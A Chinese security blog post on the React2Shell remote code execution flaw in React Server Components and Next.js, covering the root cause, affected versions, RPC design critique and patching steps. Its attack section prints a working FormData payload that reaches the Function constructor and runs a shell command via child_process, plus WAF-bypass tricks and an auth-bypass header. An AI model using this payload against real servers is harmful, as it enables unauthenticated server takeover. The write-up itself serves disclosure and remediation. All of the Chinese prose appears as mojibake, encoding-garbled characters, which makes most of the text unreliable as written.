---
title: RSCæ ¸å¼¹çº§æ¼æ´React CVE-2025-66478
date: 2025-12-15T14:30:03+08:00
updated: 2025-12-18T10:03:46+08:00
permalink: /code/cve-2025-66478/
tags:
  - å®‰å…¨
  - react
ccby: true
draft: false
comments: true
no-rss: false
---

2025 å¹´ 12 æœˆ 3 æ—¥ï¼ŒWiz å®‰å…¨ç ”ç©¶å›¢é˜ŸæŠ«éœ²äº†ä¸€ä¸ªå½±å“ React Server Componentsï¼ˆRSCï¼‰å’Œ Next.js æ¡†æ¶çš„ä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´[^10][^11]ï¼ŒCVSS è¯„åˆ† **10.0 æ»¡åˆ†**ï¼Œè¢«ç§°ä¸º **React2Shell**ã€‚

è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ [ä¸å®‰å…¨ååºåˆ—åŒ–æ¼æ´](../../åè¯/ä¸å®‰å…¨ååºåˆ—åŒ–æ¼æ´.md)ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„ HTTP è¯·æ±‚å‘é€è‡³ä»»æ„ Server Function ç«¯ç‚¹ï¼Œå½“ React Flight åè®®ååºåˆ—åŒ–è¯¥è¯·æ±‚æ—¶ï¼Œå³å¯åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚

> [!warning] æ ¸å¼¹çº§ä½†æ”»å‡»é¢å¯èƒ½æ²¡æœ‰æƒ³è±¡ä¸­é‚£ä¹ˆå¤§
> **æ— éœ€è®¤è¯ã€é»˜è®¤é…ç½®å—å½±å“ã€æ˜“äºåˆ©ç”¨**ï¼Œçº¦ 39% çš„äº‘ç¯å¢ƒå¯èƒ½å—åˆ°å½±å“ã€‚æ¼æ´å…¬å¼€åä¸ä¹…ï¼Œå¤šä¸ªå›½å®¶æ”¯æŒçš„ APT ç»„ç»‡å·²å¼€å§‹ç§¯æåˆ©ç”¨è¯¥æ¼æ´è¿›è¡Œæ”»å‡»ã€‚ä½†äº‹å®ä¸Šç»å¤§éƒ¨åˆ†åº”ç”¨éƒ½æ˜¯ä½¿ç”¨çš„ CSR/SSG è€Œé SSR åº”ç”¨ï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨çš„è¿™ä¸€å¤§éƒ¨åˆ†ä¸­ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†å¹¶æ²¡æœ‰å‡çº§åˆ°æ”¯æŒ RSC æ”¯æŒçš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥å®é™…å½±å“èŒƒå›´å¯èƒ½è¿œå°äº 39%ã€‚

# æ¼æ´æè¿°

CVE-2025-66478ï¼ˆNext.jsï¼‰[^10]å®é™…ä¸Šæ˜¯ CVE-2025-55182ï¼ˆReactï¼‰[^11]åœ¨ Next.js æ¡†æ¶ä¸­çš„è¡¨ç°å½¢å¼ï¼Œä¸¤è€…çš„æ ¹æœ¬åŸå› ç›¸åŒã€‚

æ¼æ´å­˜åœ¨äº React Flight åè®®çš„ååºåˆ—åŒ–é€»è¾‘ä¸­ï¼Œå…·ä½“ä½äº `ReactFlightReplyServer.js` æ–‡ä»¶çš„ `getOutlinedModel()` å‡½æ•°ï¼š

```javascript
function getOutlinedModel(response, reference, parentObject, key, map) {
  reference = reference.split(":");
  var id = parseInt(reference[0], 16);
  var parentObject = response.chunks[id];

  // âš ï¸ è·¯å¾„éå†æ¼æ´ - æ²¡æœ‰ hasOwnProperty æ£€æŸ¥ï¼
  for (var key = 1; key < reference.length; key++)
    parentObject = parentObject[reference[key]];  // VULNERABLE!

  return map(response, parentObject);
}
```

æ”»å‡»è€…é€šè¿‡å†’å·åˆ†éš”çš„è·¯å¾„éå†åŸå‹é“¾ï¼Œè·å– `Function` æ„é€ å‡½æ•°åæ‰§è¡Œä»»æ„ä»£ç ï¼š

```javascript
// Payload: "$1:constructor:constructor"
chunk[1]["constructor"]     // â†’ [Function: Object]
Object["constructor"]       // â†’ [Function: Function]
// æœ€ç»ˆè·å¾— Function æ„é€ å‡½æ•°ï¼Œå¯æ‰§è¡Œä»»æ„ä»£ç ï¼
```

# å½±å“èŒƒå›´

> [!warning] æœ¬åšå®¢æ ‡æ³¨ version å¯èƒ½ä¸å‡†ç¡®ï¼Œè¯·ä»¥å®˜æ–¹å…¬å‘Šä¸ºå‡†[^10][^11]ã€‚

| äº§å“ | å—å½±å“ç‰ˆæœ¬ | ä¿®å¤ç‰ˆæœ¬ |
| --- | --- | --- |
| React[^11] | 19.0.0, 19.1.0, 19.1.1, 19.2.0 | 19.0.1, 19.1.2, 19.2.1 |
| Next.js[^10] | 15.x, 16.x (ä½¿ç”¨ App Router) | 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 |

å…¶ä»–å—å½±å“çš„æ¡†æ¶/å·¥å…·åŒ…æ‹¬ï¼š`react-server-dom-webpack`ã€`react-server-dom-parcel`ã€`react-server-dom-turbopack`ã€React Routerï¼ˆä½¿ç”¨ RSC çš„ç‰ˆæœ¬ï¼‰ç­‰ã€‚

# æ ¸å¿ƒé—®é¢˜

ä» RPC å®‰å…¨è§†è§’æ¥çœ‹ï¼ŒServer Actions å’Œ RSC æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ RPC å®ç°ã€‚ä½†ä¸æˆç†Ÿçš„ RPC æ¡†æ¶ç›¸æ¯”ï¼ŒReact Flight åè®®åœ¨è®¾è®¡ä¸Šå­˜åœ¨æ ¹æœ¬æ€§ç¼ºé™·ï¼š

| æ¡†æ¶ | Schema éªŒè¯ | æ–¹æ³•ç™½åå• | å‚æ•°éªŒè¯ | åŸå‹é“¾ä¿æŠ¤ |
| --- | --- | --- | --- | --- |
| **gRPC** | âœ… Protobuf å¼ºåˆ¶å®šä¹‰ | âœ… æ˜¾å¼æ³¨å†Œ | âœ… ç¼–è¯‘æœŸå¼ºåˆ¶ | âœ… äºŒè¿›åˆ¶åè®®ï¼Œä¸æ¶‰åŠ |
| **tRPC** | âœ… Zod/TypeBox | âœ… æ˜¾å¼å®šä¹‰è·¯ç”± | âœ… è¿è¡Œæ—¶+ç±»å‹æ¨æ–­ | âœ… ä¸ä¾èµ–åŸå‹é“¾ |
| **Apache Thrift** | âœ… IDL å¼ºåˆ¶å®šä¹‰ | âœ… æœåŠ¡æ¥å£å®šä¹‰ | âœ… ç¼–è¯‘æœŸå¼ºåˆ¶ | âœ… äºŒè¿›åˆ¶åè®®ï¼Œä¸æ¶‰åŠ |
| **Dubbo** | âœ… Java æ¥å£å®šä¹‰ | âœ… æœåŠ¡æš´éœ²ç™½åå• | âœ… å¼ºç±»å‹ | âš ï¸ Hessian æ›¾æœ‰ååºåˆ—åŒ–æ¼æ´ |
| **GraphQL** | âœ… Schema å¼ºåˆ¶ | âœ… æ˜¾å¼å®šä¹‰ Resolver | âš ï¸ éœ€é¢å¤–éªŒè¯å±‚ | âœ… ä¸ä¾èµ–åŸå‹é“¾ |
| **JSON-RPC** | âš ï¸ å¯é€‰ï¼ˆéœ€è‡ªè¡Œå®ç°ï¼‰ | âœ… æ–¹æ³•åæ˜ å°„ | âš ï¸ éœ€è‡ªè¡Œå®ç° | âš ï¸ å–å†³äºå®ç° |
| **Hono RPC** | âœ… Zod éªŒè¯ | âœ… è·¯ç”±å®šä¹‰ | âœ… ä¸­é—´ä»¶éªŒè¯ | âœ… ä¸ä¾èµ–åŸå‹é“¾ |
| **SOAP** | âœ… WSDL/XSD å¼ºåˆ¶ | âœ… æ“ä½œå®šä¹‰ | âœ… XML Schema | âš ï¸ XXE é£é™©ï¼ˆéœ€ç¦ç”¨å¤–éƒ¨å®ä½“ï¼‰ |
| **React Flight** | âŒ æ—  | âŒ ç¼ºå¤± | âŒ ç¼ºå¤± | âŒ æœªæ£€æŸ¥ hasOwnProperty |

> [!info] å›¾ä¾‹è¯´æ˜
> - âœ… æ¡†æ¶åŸç”Ÿæ”¯æŒæˆ–å¼ºåˆ¶è¦æ±‚
> - âš ï¸ å¯é€‰ã€éœ€é¢å¤–é…ç½®æˆ–å†å²ä¸Šå­˜åœ¨ç›¸å…³é—®é¢˜
> - âŒ ç¼ºå¤±æˆ–è®¾è®¡ä¸Šå­˜åœ¨ç¼ºé™·

> [!tip] å®‰å…¨æ•™è®­
> ä»»ä½• RPC ç³»ç»Ÿéƒ½å¿…é¡»å‡è®¾å®¢æˆ·ç«¯è¾“å…¥æ˜¯**å®Œå…¨ä¸å¯ä¿¡**çš„ï¼Œéœ€è¦åœ¨åè®®å±‚é¢å¼ºåˆ¶æ‰§è¡Œç±»å‹å®‰å…¨å’Œè®¿é—®æ§åˆ¶ï¼Œè€Œä¸æ˜¯ä¾èµ–è¿è¡Œæ—¶æ£€æŸ¥ã€‚

# é¢˜å¤–è¯ï¼šRSC çš„"æ”¿æ²»"å› ç´ 

æŠ›å¼€æŠ€æœ¯ä¸è°ˆï¼Œè¿™ä¸ªæ¼æ´çš„å‡ºç°ä¹Ÿè®©äººä¸å¾—ä¸æ€è€ƒ RSC è¯ç”Ÿçš„èƒŒæ™¯ï¼Œäº‹å®ä¸Šï¼Œç¤¾åŒºå¯¹ Vercel ä¸»å¯¼ React ç”Ÿæ€çš„ä¸æ»¡ç”±æ¥å·²ä¹…[^2][^3][^4][^5]ã€‚

Vercel ä½œä¸º Next.js çš„ä¸»è¦ç»´æŠ¤è€…å’Œå•†ä¸šåŒ–å…¬å¸ï¼Œä¸€ç›´åœ¨ç§¯ææ¨åŠ¨ React Server Components å’Œ Server Actions çš„è½åœ°ï¼š**2021 å¹´åº•ï¼ŒVercel æ‹›è˜äº† React æ ¸å¿ƒå›¢é˜Ÿæˆå‘˜ Sebastian MarkbÃ¥ge**[^6]â€”â€”ä»–æ­£æ˜¯ RSC çš„ä¸»è¦è®¾è®¡è€…ï¼›**2022 å¹´ 10 æœˆï¼ŒNext.js 13 å‘å¸ƒ**[^7]ï¼Œæˆä¸ºé¦–ä¸ªæ”¯æŒ RSC çš„ä¸»æµæ¡†æ¶ã€‚é€šè¿‡æ¨¡ç³Šå‰åç«¯è¾¹ç•Œã€è®©å¼€å‘è€…"æ— æ„Ÿ"åœ°ç¼–å†™æœåŠ¡ç«¯ä»£ç ï¼Œè¡¨é¢ä¸Šé™ä½äº†ä½¿ç”¨é—¨æ§›ï¼Œå®é™…ä¸Šå´å¢åŠ äº†æ¡†æ¶çš„å¤æ‚åº¦å’Œå¯¹ç‰¹å®šéƒ¨ç½²å¹³å°çš„ä¾èµ–ã€‚

è¿™ç§ç­–ç•¥çš„å•†ä¸šé€»è¾‘å¾ˆæ¸…æ™°ï¼š
- **å€’é€¼ React ç¤¾åŒº**ï¼šRSC æœ€åˆæ˜¯ Vercel ä¸ React å›¢é˜Ÿåˆä½œæ¨åŠ¨çš„ï¼ŒNext.js æ˜¯ RSC çš„ç¬¬ä¸€ä¸ªä¹Ÿæ˜¯æœ€ä¸»è¦çš„å®ç°è½½ä½“
- **å¢åŠ å¹³å°ç²˜æ€§**ï¼šServer Actions çš„"é›¶é…ç½®"ä½“éªŒåœ¨ Vercel å¹³å°ä¸Šæœ€ä¸ºé¡ºç•…ï¼Œè‡ªè¡Œéƒ¨ç½²åˆ™éœ€è¦å¤„ç†æ›´å¤šçš„è¾¹ç¼˜æƒ…å†µ
- **æ¨¡ç³Šå®‰å…¨è¾¹ç•Œ**ï¼šå½“å¼€å‘è€…ä¹ æƒ¯äº†åœ¨ç»„ä»¶é‡Œç›´æ¥å†™ `'use server'`ï¼Œå¾ˆå®¹æ˜“å¿½è§†è¿™èƒŒåå…¶å®æ˜¯ä¸€ä¸ªå®Œæ•´çš„ RPC è°ƒç”¨é“¾

> [!quote] æœ‰è¶£çš„æ˜¯
> è¿™ç§"ç®€åŒ–"åè€Œå¯¼è‡´äº†å®‰å…¨è®¾è®¡çš„ç–å¿½â€”â€”æˆç†Ÿçš„ RPC æ¡†æ¶ï¼ˆgRPCã€dubboã€thriftï¼‰åå‡ å¹´ç§¯ç´¯çš„å®‰å…¨æœ€ä½³å®è·µï¼Œåœ¨ React Flight åè®®ä¸­å‡ ä¹æ˜¯ä»é›¶å¼€å§‹ã€‚

å½“ç„¶ï¼Œè¿™ä¸æ˜¯è¯´ Vercel æœ‰æ„å¼•å…¥æ¼æ´ï¼Œè€Œæ˜¯**å•†ä¸šé©±åŠ¨çš„"å¼€å‘ä½“éªŒä¼˜å…ˆ"ç­–ç•¥ï¼Œå¯èƒ½åœ¨æ— å½¢ä¸­ç‰ºç‰²äº†å®‰å…¨è¾¹ç•Œçš„æ¸…æ™°æ€§**ã€‚è¿™ç§ç­–ç•¥çš„é—®é¢˜åœ¨äºï¼š

1. **éšè—å¤æ‚æ€§ â‰  æ¶ˆé™¤å¤æ‚æ€§**ï¼š`'use server'` çœ‹èµ·æ¥åªæ˜¯ä¸€ä¸ªæŒ‡ä»¤ï¼Œä½†èƒŒåæ¶‰åŠåºåˆ—åŒ–ã€ç½‘ç»œä¼ è¾“ã€ååºåˆ—åŒ–ã€æƒé™éªŒè¯ç­‰å®Œæ•´é“¾è·¯ã€‚å½“å¼€å‘è€…ä¸ç†è§£è¿™äº›ç¯èŠ‚æ—¶ï¼Œå°±æ— æ³•æ­£ç¡®è¯„ä¼°é£é™©
2. **"é›¶é…ç½®"æ„å‘³ç€"é›¶æ€è€ƒ"**ï¼šä¼ ç»Ÿ RPC æ¡†æ¶è¦æ±‚å¼€å‘è€…æ˜¾å¼å®šä¹‰æ¥å£ã€å‚æ•°ç±»å‹ã€é”™è¯¯å¤„ç†ï¼Œè¿™äº›"ç¹ç"çš„æ­¥éª¤å®é™…ä¸Šæ˜¯å®‰å…¨æ£€æŸ¥ç‚¹ã€‚å»æ‰è¿™äº›æ­¥éª¤ï¼Œå®‰å…¨è´£ä»»å°±ä»æ¡†æ¶è½¬ç§»åˆ°äº†ï¼ˆç‰¹åˆ«æ˜¯å¾€å¾€ä¸å…·å¤‡å®‰å…¨æ„è¯†çš„ï¼‰å¼€å‘è€…ï¼ˆå¦‚å®Œå…¨æ²¡æœ‰åç«¯ç»éªŒçš„å‰ç«¯å¼€å‘äººå‘˜ï¼‰èº«ä¸Šï¼Œä»–ä»¬ä¸é€‚åˆä½¿ç”¨è¿™ç§æ— ã€å¼±ä¿æŠ¤çš„æ¡†æ¶ï¼Œè¿™åœ¨ PHP çš„æ¡†æ¶ä¸­å‡ºç°çš„æ›´å¤šã€‚
3. **æŠ½è±¡æ³„æ¼çš„ä»£ä»·æ›´é«˜**ï¼šå½“"é­”æ³•"å¤±æ•ˆæ—¶ï¼Œå¼€å‘è€…é¢å¯¹çš„æ˜¯ä¸€ä¸ªè‡ªå·±å®Œå…¨ä¸ç†è§£çš„ç³»ç»Ÿï¼Œè°ƒè¯•å’Œä¿®å¤çš„æˆæœ¬è¿œé«˜äºä¸€å¼€å§‹å°±ç†è§£åº•å±‚æœºåˆ¶

> [!example] å‰è½¦ä¹‹é‰´ï¼šCVE-2025-29927 ä¸­é—´ä»¶æˆæƒç»•è¿‡
> æ•°æœˆå‰ Next.js åˆšå‡ºè¿‡ä¸€ä¸ªåŒæ¬¾æ¼æ´â€”â€”**CVE-2025-29927**ï¼ˆCVSS 9.1ï¼‰ã€‚æ”»å‡»è€…åœ¨è¯·æ±‚å¤´åŠ ä¸Š `x-middleware-subrequest: 1`ï¼Œä½ çš„ä¸­é—´ä»¶é‰´æƒå°±é›†ä½“ç½¢å·¥äº†ã€‚è¿™ä¸ªè¯·æ±‚å¤´æœ¬æ˜¯æ¡†æ¶å†…éƒ¨ç”¨æ¥é˜²æ­¢ä¸­é—´ä»¶æ— é™å¾ªç¯çš„"å‘˜å·¥æš—å·"ï¼Œæ²¡æƒ³åˆ°æš—å·ç›´æ¥å†™é—¨ä¸Šäº†ã€‚
> 
> ä¸¤ä¸ªæ¼æ´ï¼Œä¸€ä¸ªé…æ–¹ï¼š**ä½ ä»¥ä¸ºçš„"å®ç°ç»†èŠ‚"ï¼Œæ”»å‡»è€…çœ¼é‡Œçš„"é‚€è¯·å‡½"**ã€‚

å¦ç‡åœ°è¯´ï¼Œå¦‚æœ Vercel ç»§ç»­ä»¥è¿™ç§"é­”æ³•ä¼˜å…ˆ"çš„æ–¹å¼è¿­ä»£ Next.jsâ€”â€”æŠŠè¶Šæ¥è¶Šå¤šçš„å†…éƒ¨æœºåˆ¶è—åœ¨å¼€å‘è€…çœ‹ä¸è§çš„åœ°æ–¹ï¼ŒåŒæ—¶ä¸æ–­æ‰©å¤§æœåŠ¡ç«¯çš„æ”»å‡»é¢â€”â€”é‚£ä¹ˆ CVE-2025-29927 å’Œ CVE-2025-66478 ææ€•åªæ˜¯**åºç« **ï¼Œè€Œé**ç»ˆç« **ã€‚æ¯•ç«Ÿï¼Œæ¯ä¸€ä¸ª"è®©å¼€å‘è€…å°‘å†™ä¸€è¡Œä»£ç "çš„ç‰¹æ€§ï¼ŒèƒŒåéƒ½å¯èƒ½æ˜¯å®‰å…¨å›¢é˜Ÿéœ€è¦å¤šå®¡è®¡ä¸€ç™¾è¡Œçš„éšè—é€»è¾‘ï¼Œè€Œ Vercel å¹¶æ²¡æœ‰ä¸€ä¸ªè¶³å¤Ÿå¼ºå¤§çš„å®‰å…¨å›¢é˜Ÿæ¥ä¿è¯è¿™ä¸€ç‚¹ã€‚

> [!tip] ğŸ å› ç¥¸å¾—ç¦ï¼Ÿ
> è¯åˆåˆåˆè¯´å›æ¥ï¼Œè¢« Vercel "ç»‘æ¶"ä¹Ÿä¸æ˜¯æ²¡æœ‰å¥½å¤„â€”â€”æ¯•ç«Ÿé¡¶æµæ¡†æ¶è‡ªå¸¦"å…¨ç½‘ç›¯æ¢¢"æœåŠ¡ã€‚æ¼æ´åˆšå†’å¤´ï¼Œå®‰å…¨ç ”ç©¶å‘˜ã€æ¨ç‰¹é”®ç›˜ä¾ ã€ç«å“å…¬å¸çš„ PR å›¢é˜Ÿå°±å·²ç»æ‘©æ‹³æ“¦æŒç­‰ç€å‘æ–‡äº†ã€‚è¿™ç§"ä¼—ç›®ç½ç½"çš„å‹åŠ›ä¸‹ï¼Œè¡¥ä¸é€šå¸¸æ¯”å¤–å–è¿˜å¿«ã€‚æ¢æˆæŸäº›å°ä¼—æ¡†æ¶ï¼Œæ¼æ´å¯èƒ½åœ¨ GitHub Issues é‡Œèººåˆ°åœ°è€å¤©è’ï¼Œç­‰ä½ å‘ç°æ—¶é»‘å®¢æ—©å°±æŒ–å®ŒçŸ¿è·‘è·¯äº†ã€‚æ‰€ä»¥ï¼Œå–œæ"VIP çº§æ¼æ´å“åº”é€Ÿåº¦"â€”â€”è™½ç„¶æ¼æ´å¤šäº†ç‚¹ï¼Œä½†è‡³å°‘ä¿®å¾—å¿«å˜›ã€‚

# æ”»å‡»ç¤ºä¾‹

æœ€å° RCE Payload æ„é€ [^1]ï¼š

```javascript
const formData = new FormData();
formData.append('0', JSON.stringify({
  then: "$1:__proto__:then",
  status: "fulfilled",
  value: null,
  _response: {
    _formData: { get: "$1:constructor:constructor" },
    _prefix: 'return process.mainModule.require("child_process").execSync("whoami").toString()'
  }
}));
formData.append('1', '"$@0"');
formData.append('2', '[]');
```

æ›´ç³Ÿç³•çš„æ˜¯ï¼Œè¿™ä¸ªæ¼æ´è¿˜å¯ä»¥ç»•è¿‡ WAFï¼š
- **è¶…å¤§è¯·æ±‚ä½“ç»•è¿‡**ï¼šAWS WAF é»˜è®¤åªæ£€æŸ¥è¯·æ±‚ä½“å‰ 8-64KBï¼Œå°†æ¶æ„ payload æ”¾åœ¨æ£€æŸ¥é™åˆ¶ä¹‹åå³å¯ç»•è¿‡
- **åˆ†å—ä¼ è¾“ç¼–ç ç»•è¿‡**ï¼šåˆ©ç”¨ HTTP/1.1 çš„åˆ†å—ä¼ è¾“ï¼Œå°†æ¶æ„æ¨¡å¼æ‹†åˆ†åˆ°ä¸åŒçš„ chunk ä¸­

> [!note] ğŸ­ "ä¿® Bug ä¸æˆåæ·»å µ"ï¼šCloudflare çš„å²è¯—çº§ç¿»è½¦
> è¯´åˆ° WAF ç»•è¿‡ï¼Œå°±ä¸å¾—ä¸æ Cloudflare çš„ç¥æ“ä½œã€‚2025 å¹´ 12 æœˆ 5 æ—¥ï¼Œä¸ºäº†æ‹¦æˆª React2Shell çš„æ¶æ„ Payloadï¼ŒCloudflare ç´§æ€¥å°† WAF è¯·æ±‚ä½“ç¼“å†²åŒºä» 128KB æå‡è‡³ 1MB â€”â€” å¬èµ·æ¥å¾ˆåˆç†å¯¹å§ï¼Ÿ
> 
> ç„¶è€Œï¼Œéƒ¨ç½²è¿‡ç¨‹ä¸­å…³é—­å†…éƒ¨æµ‹è¯•å·¥å…·çš„æ“ä½œè§¦å‘äº† FL1 ä»£ç†ä¸­ä»æœªç»è¿‡ä½¿ç”¨å’Œæµ‹è¯•ä¸”æœªæ¥è¦ä¸‹çº¿çš„çš„ Lua ä»£ç é”™è¯¯ï¼Œå¯¼è‡´**å…¨çƒçº¦ 28% çš„ HTTP æµé‡åœ¨ 25 åˆ†é’Ÿå†…â€œå–œæâ€ 500 é”™è¯¯**ã€‚Zoomã€LinkedInã€Coinbaseã€Canva ç­‰çŸ¥åç½‘ç«™çº·çº·èººæªã€‚
> 
> è¿™å¤§æ¦‚å°±æ˜¯æ‰€è°“çš„"æ¼æ´æ²¡å µä½ï¼Œå…ˆæŠŠè‡ªå·±å µæ­»äº†"ã€‚å®‰å…¨ä¸å¯ç”¨æ€§çš„å¹³è¡¡ï¼Œæ°¸è¿œæ˜¯ä¸ªæŠ€æœ¯æ´»ã€‚[^8]
> 
> è¯´èµ· Lua ç¿»è½¦ï¼Œè¿™è®©äººä¸ç¦æƒ³èµ· 2021 å¹´ 7 æœˆ 13 æ—¥çš„ Bç«™"713 äº‹ä»¶"[^9]â€”â€”åŒæ ·æ˜¯ Luaï¼ŒåŒæ ·æ˜¯ä¸€ä¸ªçœ‹ä¼¼æ— å®³çš„å°ç–å¿½ï¼šGCD å‡½æ•°æ²¡å¯¹è¾“å…¥å‚æ•°åšç±»å‹æ£€æŸ¥ï¼Œå½“æ”¶åˆ°å­—ç¬¦ä¸² `"0"` æ—¶è§¦å‘æ— é™é€’å½’ï¼ŒCPU ç›´æ¥æ‹‰æ»¡ï¼Œ**æ•´ä¸ª Bç«™å®•æœºè¿‘ 3 å°æ—¶**ã€‚ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹²ç¿»ä¸€ä¸ªè§†é¢‘å¹³å°ï¼ŒLuaï¼šè¿™é”…æˆ‘ä¸èƒŒï¼ˆå¥½å§å…¶å®è¿˜æ˜¯è¦èƒŒçš„ï¼Œ å›å¤´æœ‰ç©ºå†ç»†æ•° lua çš„å‘ï¼‰ã€‚

# å¤„ç†æ–¹æ¡ˆ

> [!danger] è‡ªåŠ¨åŒ–å·¥å…·é™·é˜±
> ç”±äº CVE-2025-66478ï¼ˆNext.jsï¼‰çš„æ ¹æœ¬åŸå› ä¸ CVE-2025-55182ï¼ˆReactï¼‰ç›¸åŒï¼Œéƒ¨åˆ† CVE æ•°æ®åº“å¯èƒ½å°† Next.js çš„ CVE æ ‡è®°ä¸º"é‡å¤"ã€‚è¿™ä¼šå¯¼è‡´ **Dependabotã€Snyk ç­‰è‡ªåŠ¨åŒ– CVE ä¿®å¤å·¥å…·å¯èƒ½ä»…æ›´æ–° React è€Œå¿½ç•¥ Next.js**ã€‚
> 
> ç„¶è€Œï¼Œ**Next.js åœ¨ `node_modules/next/dist/compiled/next-server/` ç›®å½•ä¸­é¢„ç¼–è¯‘æ‰“åŒ…äº†ä¸€ä»½å®Œæ•´çš„ `react-server-dom-webpack` ä»£ç **ï¼ˆåŒ…å«æ¼æ´å‡½æ•° `getOutlinedModel`ï¼‰ï¼Œä»…æ›´æ–° `node_modules/react` å¹¶ä¸èƒ½ä¿®å¤è¿™ä»½å†…ç½®ä»£ç ã€‚**è¯·åŠ¡å¿…åŒæ—¶æ›´æ–° React å’Œ Next.jsï¼**

## 1. ç«‹å³å‡çº§

```bash
# å‡çº§ React
npm install react@19.2.1 react-dom@19.2.1

# âš ï¸ å¿…é¡»åŒæ—¶å‡çº§ Next.jsï¼
npm install next@15.5.7
# æˆ–
npm install next@16.0.7
```

## 2. ä½¿ç”¨å®˜æ–¹ä¿®å¤å·¥å…·

Vercel Labs å‘å¸ƒäº†è‡ªåŠ¨ä¿®å¤å·¥å…·[^12]ï¼š

```bash
npx fix-react2shell-next
```

è¯¥å·¥å…·å¯è‡ªåŠ¨æ£€æµ‹å—å½±å“çš„ä¾èµ–ã€é€’å½’æ‰«ææ‰€æœ‰ package.jsonã€æ”¯æŒå¤šç§åŒ…ç®¡ç†å™¨ã€‚

[^1]: ejpir. CVE-2025-55182-research[EB/OL]. GitHub, 2025-12. https://github.com/ejpir/CVE-2025-55182-research
[^2]: weijunext. React Server Components å¼•å‘çš„è®¨è®º[EB/OL]. weijunext.com, 2023. https://weijunext.com/article/react-server-components-discussion
[^3]: Ryan Talbert. Next.js, React, and JavaScript Discussion[EB/OL]. LinkedIn, 2024-10-31. https://www.linkedin.com/posts/ryan-talbert_nextjs-react-javascript-activity-7254861111613640704-HA6P
[^4]: Julia Schmidt. React ecosystem is fractured but Vercel is not the villain, argues Redux maintainer[EB/OL]. DevClass, 2025-06-23. https://devclass.com/2025/06/23/react-ecosystem-is-fractured-but-vercel-is-not-the-villain-argues-redux-maintainer/
[^5]: Jack Herrington. The React, Next.js and Vercel Controversy[EB/OL]. Pro Next.js, 2024. https://www.pronextjs.dev/workshops/pro-next-js-workshop-hl06z/the-react-nextjs-and-vercel-controversy
[^6]: ä½šå. Vercel æ‹›è˜ Sebastian MarkbÃ¥ge æ¨åŠ¨ RSC å‘å±•[EB/OL]. åšå®¢å›­, 2023-09. https://www.cnblogs.com/sexintercourse/p/17687645.html
[^7]: InfoQ ä¸­æ–‡ç«™. Next.js 13 å‘å¸ƒï¼Œé¦–ä¸ªæ”¯æŒ RSC çš„ä¸»æµæ¡†æ¶[EB/OL]. InfoQ, 2022-10. https://www.infoq.cn/article/kJHgAGVuJHwgogZfLISe
[^8]: Cloudflare. 5 December 2025 outage post-mortem[EB/OL]. Cloudflare Blog, 2025-12-05. https://blog.cloudflare.com/zh-cn/5-december-2025-outage
[^9]: æ¾æ¹ƒæ–°é—». Bç«™713äº‹æ•…æŠ€æœ¯å¤ç›˜ï¼šLua GCDå‡½æ•°æ— é™é€’å½’å¯¼è‡´æœåŠ¡å´©æºƒ[EB/OL]. æ¾æ¹ƒæ–°é—», 2021-07-14. https://m.thepaper.cn/newsDetail_forward_19154018
[^10]: Next.js Team. CVE-2025-66478[EB/OL]. Next.js Blog, 2025-12-03. https://nextjs.org/blog/CVE-2025-66478
[^11]: React Team. Critical Security Vulnerability in React Server Components[EB/OL]. React Blog, 2025-12-03. https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
[^12]: Vercel Labs. fix-react2shell-next[EB/OL]. GitHub, 2025-12. https://github.com/vercel-labs/fix-react2shell-next